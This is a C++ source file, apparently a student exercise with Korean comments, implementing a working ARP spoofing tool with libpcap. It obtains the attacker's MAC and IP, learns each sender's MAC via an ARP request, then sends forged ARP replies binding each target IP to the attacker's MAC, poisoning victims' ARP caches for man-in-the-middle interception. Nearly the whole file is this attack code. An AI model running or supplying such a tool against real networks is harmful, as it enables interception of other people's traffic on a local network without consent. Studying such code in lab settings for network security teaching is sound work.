#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

typedef struct MacIp {
    Mac mac_;
    Ip ip_;
} MacIp;

#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void set_attacker(MacIp* attacker, char* dev){
    struct ifreq ifr;
    memset(&ifr, 0x00, sizeof(ifr));
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if(sockfd < 0){
        printf("fail to socket\n");
        exit(-1);
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    int ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if(ret < 0){
        fprintf(stderr, "Fail to get MAC address\n");
        close(sockfd);
        exit(-1);
    }

    uint8_t tmpMAC[sizeof(Mac)];
    for(int i = 0; i < sizeof(Mac); i++)
        tmpMAC[i] = ifr.ifr_hwaddr.sa_data[i]&0xFF;
    attacker -> mac_ = Mac(tmpMAC);

    // IP
    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if(ret < 0){
        fprintf(stderr, "Fail to get IP address\n");
        close(sockfd);
        exit(-1);
    }
    attacker -> ip_ = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    close(sockfd);

}

EthArpPacket make_EthArpPacket(MacIp* s, MacIp* d, uint16_t op){
    EthArpPacket packet;

    packet.eth_.dmac_ = d -> mac_;
    packet.eth_.smac_ = s -> mac_;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    packet.arp_.smac_ = s -> mac_;
    packet.arp_.sip_ = htonl(s -> ip_);
    packet.arp_.tmac_ = d -> mac_;
    packet.arp_.tip_ = htonl(d -> ip_);

    if(op != 2) //1(request), 2(reply)
    {   //request
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    }
    else //reply
        packet.arp_.op_ = htons(ArpHdr::Reply);

    return packet;
}

void read_EthArpPacket_set_senderMac(pcap_t* handle, MacIp* sender){
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        struct EthHdr* eth_header = (struct EthHdr*) packet;
        struct ArpHdr* arp_header = (struct ArpHdr*) &packet[sizeof(struct EthHdr)];

        if(ntohs(eth_header -> type() == EthHdr::Arp) && sender -> ip_ == arp_header -> sip()){ //sip()=ntohl(ip_)
            sender -> mac_ = arp_header -> smac_;
            return;
        }
    }
}

void send_EthArpPacket(pcap_t* handle, EthArpPacket packet){
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    return;
}

void set_senderMac(pcap_t* handle, MacIp* sender, MacIp* attacker){
    uint16_t op = 1;    //1(request)
    sender -> mac_ = Mac("FF:FF:FF:FF:FF:FF");
    EthArpPacket req_packet = make_EthArpPacket(attacker, sender, op);  //normal(Amac, ff:ff:ff:ff:ff:ff/00:00:00:00:00:00, Aip, Sip, 1)
    send_EthArpPacket(handle, req_packet);
    read_EthArpPacket_set_senderMac(handle, sender);
    return;
}

void arp_spoofing(pcap_t* handle, MacIp* sender, MacIp* attacker, MacIp* target){
    uint16_t op = 2;    //2(reply)
    attacker -> ip_ = target -> ip_; //@@ip 대입안하고 처리할 수 있는 방법 생각해보기
    EthArpPacket rep_packet = make_EthArpPacket(attacker, sender, op);  //abnormal(Amac, Smac, Tip, Sip, 2)
    send_EthArpPacket(handle, rep_packet);
    return;
}

int main(int argc, char* argv[]) {
    if (argc != 2 && (argc%2) != 0) {   // not exist sender-target pair
        usage();
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    MacIp attacker;
    set_attacker(&attacker, dev);
    Ip origin_attacker_ip = attacker.ip_;
    for(int i=2;i<argc;i=i+2){
        attacker.ip_ = origin_attacker_ip;        //ARP spoofing 과정에서 변경되기에 원래 상태로 되돌림
        MacIp sender, target;
        sender.ip_ = Ip(argv[i]);
        target.ip_ = Ip(argv[i+1]);
        set_senderMac(handle, &sender, &attacker);
        arp_spoofing(handle, &sender, &attacker, &target);
    }
    pcap_close(handle);
}
